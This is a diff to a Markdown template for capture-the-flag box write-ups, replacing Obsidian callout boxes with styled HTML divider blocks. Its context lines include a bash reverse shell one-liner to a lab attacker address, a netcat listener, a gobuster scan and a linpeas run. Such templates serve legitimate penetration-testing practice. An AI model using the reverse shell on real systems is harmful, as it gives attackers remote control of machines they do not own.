@@ -9,7 +9,7 @@ tags:
   - web
   - linux
 ---
-
+<link rel="stylesheet" href="{{ '/assets/css/obsidian-dividers.css' | relative_url }}">
 ## Box Information
 
 | Property         | Value                  |
@@ -24,9 +24,10 @@ tags:
 
 ## Summary
 
-> [!abstract] TL;DR
-> Brief one-paragraph summary of the box - what vulnerabilities were exploited and key techniques used.
-
+<div class="divider divider-info">
+    <span class="divider-title">TL;DR</span>
+    <span class="divider-content">Brief one-paragraph summary of the box - what vulnerabilities were exploited and key techniques used.</span>
+</div>
 **Key Vulnerabilities:**
 - Vulnerability 1
 - Vulnerability 2
@@ -85,8 +86,10 @@ gobuster dir -u http://10.10.11.x -w /usr/share/wordlists/dirb/common.txt
 
 **Vulnerability:** [Vulnerability Name]
 
-> [!info] Details
-> Explain the vulnerability - what it is, why it exists, how it works
+<div class="divider divider-info">
+    <span class="divider-title">Details</span>
+    <span class="divider-content">Explain the vulnerability - what it is, why it exists, how it works</span>
+</div>
 
 **Testing the vulnerability:**
 ```bash
@@ -128,9 +131,11 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
 nc -lvnp 4444
 ```
 
-> [!success] Shell Access
-> Successfully gained shell as **[username]**
 
+<div class="divider divider-root">
+    <span class="divider-title">Shell</span>
+    <span class="divider-content">Successfully gained shell as [username]</span>
+</div>
 ---
 
 ## User Flag
@@ -204,6 +209,11 @@ chmod +x ./linpeas.sh
 
 **Vulnerability:** [Escalation method]
 
+<div class="divider divider-warning">
+    <span class="divider-title">Exploitation Path</span>
+    <span class="divider-content">Detailed explanation of the privilege escalation vulnerability</span>
+</div>
+
 > [!warning] Exploitation Path
 > Detailed explanation of the privilege escalation vulnerability
 
@@ -223,6 +233,11 @@ chmod +x ./linpeas.sh
 ```bash
 # Command
 ```
+
+<div class="divider divider-root">
+    <span class="divider-title">Root Access</span>
+    <span class="divider-content">Successfully escalated privileges to root</span>
+</div>
 
 > [!success] Root Access
 > Successfully escalated privileges to **root**
